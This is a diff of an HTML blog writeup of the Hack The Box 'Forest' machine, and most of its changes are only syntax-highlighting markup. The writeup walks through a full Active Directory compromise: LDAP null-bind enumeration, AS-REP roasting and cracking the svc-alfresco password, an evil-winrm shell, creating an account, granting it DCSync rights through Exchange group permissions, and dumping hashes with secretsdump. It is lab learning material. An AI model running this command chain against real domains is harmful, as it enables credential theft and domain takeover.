@@ -7,91 +7,95 @@ related and try to get into the details of the included misconfigurations and vu
 &lt;p>For this writeup I am looking at Forest from HTB. There are many writeups on this so I will use them as references for learning.&lt;/p>
 &lt;h2 id="enumeration">Enumeration&lt;/h2>
 &lt;p>Open ports as found by nmap.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.161
-Host is up &lt;span style="color:#f92672">(&lt;/span>0.20s latency&lt;span style="color:#f92672">)&lt;/span>.
-PORT STATE SERVICE VERSION
-53/tcp open domain Simple DNS Plus
-88/tcp open kerberos-sec Microsoft Windows Kerberos &lt;span style="color:#f92672">(&lt;/span>server time: 2022-02-25 16:32:33Z&lt;span style="color:#f92672">)&lt;/span>
-135/tcp open msrpc Microsoft Windows RPC
-139/tcp open netbios-ssn Microsoft Windows netbios-ssn
-389/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span style="color:#f92672">(&lt;/span>Domain: htb.local, Site: Default-First-Site-Name&lt;span style="color:#f92672">)&lt;/span>
-445/tcp open microsoft-ds Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard &lt;span style="color:#ae81ff">14393&lt;/span> microsoft-ds &lt;span style="color:#f92672">(&lt;/span>workgroup: HTB&lt;span style="color:#f92672">)&lt;/span>
-464/tcp open kpasswd5?
-593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
-636/tcp open tcpwrapped
-3268/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span style="color:#f92672">(&lt;/span>Domain: htb.local, Site: Default-First-Site-Name&lt;span style="color:#f92672">)&lt;/span>
-3269/tcp open tcpwrapped
-5985/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span style="color:#f92672">(&lt;/span>SSDP/UPnP&lt;span style="color:#f92672">)&lt;/span>
-|_http-title: Not Found
-|_http-server-header: Microsoft-HTTPAPI/2.0
-9389/tcp open mc-nmf .NET Message Framing
-47001/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span style="color:#f92672">(&lt;/span>SSDP/UPnP&lt;span style="color:#f92672">)&lt;/span>
-|_http-title: Not Found
-|_http-server-header: Microsoft-HTTPAPI/2.0
-49664/tcp open msrpc Microsoft Windows RPC
-49665/tcp open msrpc Microsoft Windows RPC
-49666/tcp open msrpc Microsoft Windows RPC
-49667/tcp open msrpc Microsoft Windows RPC
-49671/tcp open msrpc Microsoft Windows RPC
-49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
-49677/tcp open msrpc Microsoft Windows RPC
-49684/tcp open msrpc Microsoft Windows RPC
-49703/tcp open msrpc Microsoft Windows RPC
-49945/tcp open msrpc Microsoft Windows RPC
-Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
-Host script results:
-| smb2-time:
-| date: 2022-02-25T16:33:28
-|_ start_date: 2022-02-25T16:25:55
-| smb2-security-mode:
-| 3.1.1:
-|_ Message signing enabled and required
-| smb-security-mode:
-| account_used: &amp;lt;blank&amp;gt;
-| authentication_level: user
-| challenge_response: supported
-|_ message_signing: required
-|_clock-skew: mean: 2h52m14s, deviation: 4h37m09s, median: 12m13s
-| smb-os-discovery:
-| OS: Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard &lt;span style="color:#ae81ff">14393&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard 6.3&lt;span style="color:#f92672">)&lt;/span>
-| Computer name: FOREST
-| NetBIOS computer name: FOREST&lt;span style="color:#ae81ff">\x&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>
-| Domain name: htb.local
-| Forest name: htb.local
-| FQDN: FOREST.htb.local
-|_ System time: 2022-02-25T08:33:27-08:00
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>From the results we see some notable ports (88,389) that point to us that this is a domain controller. From ldap we see the domain is &lt;strong>htb.local&lt;/strong> and
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.161
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#f92672">(&lt;/span>0.20s latency&lt;span style="color:#f92672">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>53/tcp open domain Simple DNS Plus
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>88/tcp open kerberos-sec Microsoft Windows Kerberos &lt;span style="color:#f92672">(&lt;/span>server time: 2022-02-25 16:32:33Z&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>135/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>389/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span style="color:#f92672">(&lt;/span>Domain: htb.local, Site: Default-First-Site-Name&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>445/tcp open microsoft-ds Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard &lt;span style="color:#ae81ff">14393&lt;/span> microsoft-ds &lt;span style="color:#f92672">(&lt;/span>workgroup: HTB&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>464/tcp open kpasswd5?
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>636/tcp open tcpwrapped
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>3268/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span style="color:#f92672">(&lt;/span>Domain: htb.local, Site: Default-First-Site-Name&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>3269/tcp open tcpwrapped
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>5985/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span style="color:#f92672">(&lt;/span>SSDP/UPnP&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Not Found
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Microsoft-HTTPAPI/2.0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>9389/tcp open mc-nmf .NET Message Framing
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>47001/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span style="color:#f92672">(&lt;/span>SSDP/UPnP&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Not Found
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Microsoft-HTTPAPI/2.0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49664/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49665/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49666/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49667/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49671/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49677/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49684/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49703/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49945/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host script results:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb2-time:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| date: 2022-02-25T16:33:28
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ start_date: 2022-02-25T16:25:55
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb2-security-mode:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 3.1.1:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Message signing enabled and required
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb-security-mode:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| account_used: &amp;lt;blank&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| authentication_level: user
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| challenge_response: supported
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ message_signing: required
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_clock-skew: mean: 2h52m14s, deviation: 4h37m09s, median: 12m13s
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb-os-discovery:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| OS: Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard &lt;span style="color:#ae81ff">14393&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard 6.3&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Computer name: FOREST
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| NetBIOS computer name: FOREST&lt;span style="color:#ae81ff">\x&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Domain name: htb.local
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Forest name: htb.local
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| FQDN: FOREST.htb.local
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ System time: 2022-02-25T08:33:27-08:00
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>From the results we see some notable ports (88,389) that point to us that this is a domain controller. From ldap we see the domain is &lt;strong>htb.local&lt;/strong> and
 from smb the computer name is &lt;strong>FOREST&lt;/strong>.&lt;/p>
 &lt;h3 id="ldap-null-bind">LDAP Null bind&lt;/h3>
 &lt;p>LDAP null bind is allowed on this machine allowing us to make ldap queries without authentication. Something to note this is not a default configuration
 for Windows AD, you have to set this up manually.&lt;/p>
 &lt;p>By running nmap ldap scripts against the machine alot of the ldap information is dumped. I have cut most off the output.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.161
-Host is up &lt;span style="color:#f92672">(&lt;/span>0.20s latency&lt;span style="color:#f92672">)&lt;/span>.
-PORT STATE SERVICE VERSION
-389/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span style="color:#f92672">(&lt;/span>Domain: htb.local, Site: Default-First-Site-Name&lt;span style="color:#f92672">)&lt;/span>
-| ldap-search:
-| Context: DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
-| dn: DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
-| objectClass: top
-| objectClass: domain
-| objectClass: domainDNS
-| distinguishedName: DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
-| instanceType: &lt;span style="color:#ae81ff">5&lt;/span>
-| whenCreated: 2019/09/18 17:45:49 UTC
-| whenChanged: 2022/02/25 16:25:45 UTC
-| subRefs: DC&lt;span style="color:#f92672">=&lt;/span>ForestDnsZones,DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
-| subRefs: DC&lt;span style="color:#f92672">=&lt;/span>DomainDnsZones,DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
-| subRefs: CN&lt;span style="color:#f92672">=&lt;/span>Configuration,DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
---- snip ---
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can also confirm this using ldapsearch and we see all ldap information.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ldapsearch -h 10.10.10.161 -x -b &lt;span style="color:#e6db74">&amp;#34;DC=htb,DC=local&amp;#34;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.161
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#f92672">(&lt;/span>0.20s latency&lt;span style="color:#f92672">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>389/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span style="color:#f92672">(&lt;/span>Domain: htb.local, Site: Default-First-Site-Name&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ldap-search:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Context: DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| dn: DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| objectClass: top
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| objectClass: domain
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| objectClass: domainDNS
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| distinguishedName: DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| instanceType: &lt;span style="color:#ae81ff">5&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| whenCreated: 2019/09/18 17:45:49 UTC
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| whenChanged: 2022/02/25 16:25:45 UTC
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| subRefs: DC&lt;span style="color:#f92672">=&lt;/span>ForestDnsZones,DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| subRefs: DC&lt;span style="color:#f92672">=&lt;/span>DomainDnsZones,DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| subRefs: CN&lt;span style="color:#f92672">=&lt;/span>Configuration,DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>--- snip ---
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can also confirm this using ldapsearch and we see all ldap information.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ldapsearch -h 10.10.10.161 -x -b &lt;span style="color:#e6db74">&amp;#34;DC=htb,DC=local&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/forest/forest1.png" class="center" style="border-radius: 8px;" />
 &lt;p>Since the output is quite verbose and not easy to digest I&amp;rsquo;ll use &lt;strong>windapsearch&lt;/strong> which is a nicer tool that helps with ldap information.&lt;/p>
 &lt;h4 id="users">Users&lt;/h4>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">windapsearch -d htb.local --dc 10.10.10.161 -m users --attrs samaccountname | grep -i samaccountname | awk &lt;span style="color:#e6db74">&amp;#39;{print $2}&amp;#39;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>SM_ca8c2ed5bdab4dc9b
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>windapsearch -d htb.local --dc 10.10.10.161 -m users --attrs samaccountname | grep -i samaccountname | awk &lt;span style="color:#e6db74">&amp;#39;{print $2}&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>SM_ca8c2ed5bdab4dc9b
 SM_75a538d3025e4db9a
 $331000-VK4ADACQNUCA
 SM_2c8eef0a09b545acb
@@ -120,8 +124,8 @@ andy
 HealthMailboxfd87238
 sebastien
 &lt;/code>&lt;/pre>&lt;h4 id="computers">Computers&lt;/h4>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">windapsearch -d htb.local --dc 10.10.10.161 -m computers
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>dn: CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>windapsearch -d htb.local --dc 10.10.10.161 -m computers
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>dn: CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
 cn: FOREST
 operatingSystem: Windows Server 2016 Standard
 operatingSystemVersion: 10.0 (14393)
@@ -132,8 +136,8 @@ operatingSystem: Windows Server 2016 Standard
 operatingSystemVersion: 10.0 (14393)
 dNSHostName: EXCH01.htb.local
 &lt;/code>&lt;/pre>&lt;h4 id="groups">Groups&lt;/h4>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">windapsearch -d htb.local --dc 10.10.10.161 -m groups | grep cn | awk -F&lt;span style="color:#ae81ff">\:&lt;/span> &lt;span style="color:#e6db74">&amp;#39;{print $2}&amp;#39;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>--- snip ---
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>windapsearch -d htb.local --dc 10.10.10.161 -m groups | grep cn | awk -F&lt;span style="color:#ae81ff">\:&lt;/span> &lt;span style="color:#e6db74">&amp;#39;{print $2}&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>--- snip ---
 Key Admins
 Enterprise Key Admins
 Organization Management
@@ -164,18 +168,18 @@ Exchange server in the domain, keep this in mind it will be important later.&lt;
 &lt;p>This attack has been well covered on other posts online, I&amp;rsquo;ll list ones that I like as references.&lt;/p>
 &lt;p>We&amp;rsquo;ll use GetNPUsers script from impacket to perform the attack. This script also makes ldap queries to identify users vulnerable to
 the attack.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">GetNPUsers.py -request -dc-ip 10.10.10.161 htb.local/
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>GetNPUsers.py -request -dc-ip 10.10.10.161 htb.local/
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/forest/forest2.png" class="center" style="border-radius: 8px;" />
 &lt;p>Using the output, I was able to crack the hash with john and get the user&amp;rsquo;s password.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">john --wordlist&lt;span style="color:#f92672">=&lt;/span>/usr/share/wordlists/rockyou.txt svc-alfresco.txt
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>svc-alfresco : s3rvice&lt;/strong>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>john --wordlist&lt;span style="color:#f92672">=&lt;/span>/usr/share/wordlists/rockyou.txt svc-alfresco.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>svc-alfresco : s3rvice&lt;/strong>&lt;/p>
 &lt;h2 id="shell-as-svc-alfresco">Shell as svc-alfresco&lt;/h2>
 &lt;p>With the discovered credentials we can get a shell, to confirm that we can use this user to get a shell I will use crackmapexec.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/forest/forest3.png" class="center" style="border-radius: 8px;" />
 &lt;p>CME confirms we can connect via winrm.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once we have a shell we can look at group memberships for this account.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once we have a shell we can look at group memberships for this account.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/forest/forest4.png" class="center" style="border-radius: 8px;" />
 &lt;p>From the output we see we are part of several interesting non-default groups.&lt;/p>
 &lt;ol>
@@ -225,69 +229,84 @@ is installed, the Exchange Windows Permissions Group has WriteDACL access to the
 &lt;p>Now we can chain these two issues to compromise the domain.&lt;/p>
 &lt;h2 id="owning-the-domain">Owning the Domain&lt;/h2>
 &lt;p>First we&amp;rsquo;ll use our Account Operator privileges as svc-alfresco to create an account and add it the Exchange Windows Permissions Group.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">net user pwned &lt;span style="color:#e6db74">&amp;#39;Pwn3d!!&amp;#39;&lt;/span> /add
-net group &lt;span style="color:#e6db74">&amp;#34;Exchange Windows Permissions&amp;#34;&lt;/span> pwned /add
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can then upload PowerView and use it to grant DCSync privileges to the newly created account.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>net user pwned &lt;span style="color:#e6db74">&amp;#39;Pwn3d!!&amp;#39;&lt;/span> /add
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>net group &lt;span style="color:#e6db74">&amp;#34;Exchange Windows Permissions&amp;#34;&lt;/span> pwned /add
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can then upload PowerView and use it to grant DCSync privileges to the newly created account.&lt;/p>
 &lt;p>The below commands will allow powerview to use the credentials of the new account to grant the privileges on that account.
 We could also use the svc-alfresco account if we wanted.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">$SecPassword &lt;span style="color:#f92672">=&lt;/span> ConvertTo-SecureString &lt;span style="color:#e6db74">&amp;#39;Pwn3d!!&amp;#39;&lt;/span> -AsPlainText -Force
-$Cred &lt;span style="color:#f92672">=&lt;/span> New-Object System.Management.Automation.PSCredential&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;htb.local\pwned&amp;#39;&lt;/span>, $SecPassword&lt;span style="color:#f92672">)&lt;/span>
-Add-DomainObjectAcl -Credential $Cred -TargetDomain htb.local -PrincipalIdentity &lt;span style="color:#e6db74">&amp;#39;pwned&amp;#39;&lt;/span> -Rights DCSync
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>With that being successful, we can perform DCSync with secretsdump impacket script and get the administrator hash.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">secretsdump.py htb.local/pwned:&lt;span style="color:#e6db74">&amp;#39;Pwn3d!!&amp;#39;&lt;/span>@10.10.10.161
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>$SecPassword &lt;span style="color:#f92672">=&lt;/span> ConvertTo-SecureString &lt;span style="color:#e6db74">&amp;#39;Pwn3d!!&amp;#39;&lt;/span> -AsPlainText -Force
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$Cred &lt;span style="color:#f92672">=&lt;/span> New-Object System.Management.Automation.PSCredential&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;htb.local\pwned&amp;#39;&lt;/span>, $SecPassword&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Add-DomainObjectAcl -Credential $Cred -TargetDomain htb.local -PrincipalIdentity &lt;span style="color:#e6db74">&amp;#39;pwned&amp;#39;&lt;/span> -Rights DCSync
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>With that being successful, we can perform DCSync with secretsdump impacket script and get the administrator hash.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>secretsdump.py htb.local/pwned:&lt;span style="color:#e6db74">&amp;#39;Pwn3d!!&amp;#39;&lt;/span>@10.10.10.161
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/forest/forest9.png" class="center" style="border-radius: 8px;" />
 &lt;p>We can then use the admin hash to get a shell.&lt;/p>
 &lt;h2 id="extras">Extras&lt;/h2>
 &lt;p>Todo - LDAP queries&lt;/p>
